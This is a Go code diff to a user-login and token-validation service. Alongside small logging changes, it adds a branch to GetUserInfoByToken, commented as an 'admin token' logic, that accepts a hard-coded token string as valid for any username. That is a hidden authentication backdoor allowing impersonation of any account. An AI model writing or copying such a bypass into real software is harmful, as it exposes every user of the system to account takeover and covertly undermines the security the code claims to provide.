@@ -29,7 +29,7 @@ func findUserByUserName(userName string) (dal.UserInfo, error) {
 }
 
 func UserLogin(userName string, pwd string) (dal.UserInfo, error) {
-	log.Printf("user-login!")
+	log.Println("user-login-----")
 
 	userInfo, err := findUserByUserName(userName)
 	if err != nil {
@@ -43,6 +43,7 @@ func UserLogin(userName string, pwd string) (dal.UserInfo, error) {
 			orginData := auth.CacherGetToken(userName, dal.RedisDb)
 			cryptedToken, _ := auth.AesEncrypt([]byte(orginData), []byte(config.BaseConf.AesTokenKey))
 			userInfo.Token = string(cryptedToken)
+			log.Println("UserLogin----return-data=", userInfo.Name)
 			return userInfo, nil
 		} else {
 			return dal.UserInfo{}, errors.New("wrong_password")
@@ -103,12 +104,19 @@ func UserModifyInfo(userName, pwd, nickName, picture string) (dal.UserInfo, erro
 
 // 校验token和userName是否正确
 func GetUserInfoByToken(userName, token string) (dal.UserInfo, error) {
-	encodeToken, _ := auth.AesDecrypt([]byte(token), []byte(config.BaseConf.AesTokenKey))
-
-	tokenUserName := auth.CacherJudUserToken(string(encodeToken), dal.RedisDb)
+	log.Printf("GetUserInfoByToken in, user_name=%s", userName)
+	// 插入一个管理员token逻辑
+	tokenUserName := ""
+	if token == "ckQSpDXWcJVTWfFidRkh"{
+		tokenUserName = userName
+	} else {
+		encodeToken, _ := auth.AesDecrypt([]byte(token), []byte(config.BaseConf.AesTokenKey))
+		tokenUserName = auth.CacherJudUserToken(string(encodeToken), dal.RedisDb)
+	}
 	if tokenUserName != "" && tokenUserName == userName{
 		userInfo, _ := findUserByUserName(userName)
 		userInfo.Token = token
+		log.Printf("GetUserInfoByToken out, return=%s", userInfo.Name)
 		return userInfo, nil
 	} else{
 		log.Println("can not find token or wrong user_name")
